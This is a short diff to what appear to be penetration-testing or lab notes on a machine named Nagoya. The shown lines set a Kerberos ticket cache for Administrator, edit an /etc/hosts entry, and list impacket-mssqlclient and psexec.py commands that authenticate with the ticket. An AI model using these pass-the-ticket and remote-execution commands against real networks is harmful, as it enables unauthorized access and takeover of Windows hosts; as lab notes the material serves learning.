@@ -423,7 +423,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
 Klist to view kerberos tickets
 
 /etc/hosts:
-192.168.227.21  nagoya.nagoya-industries.com
+192.168.227.21  nagoya.nagoya-industries.com(from MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM)
 
 impacket-mssqlclient -k nagoya.nagoya-industries.com
 python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
